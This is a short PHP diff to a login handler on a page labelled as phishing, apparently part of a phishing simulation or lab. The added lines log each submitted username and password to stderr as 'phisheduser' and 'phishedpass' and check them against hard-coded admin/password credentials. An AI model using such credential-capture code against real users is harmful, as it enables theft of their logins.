@@ -3,7 +3,14 @@
 $username = $password = $error = "";
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-	header("Location: success-phish.php");
+	file_put_contents('php://stderr', print_r("phisheduser: ".$username."\n", TRUE));
+	file_put_contents('php://stderr', print_r("phishedpass: ".$password."\n", TRUE));
+	if ($username == "admin" && $password == "password") {
+		header("Location: success-phish.php");
+	}
+	else {
+		$error = "Incorrect Credentials";
+	}
 }
 
 ?>
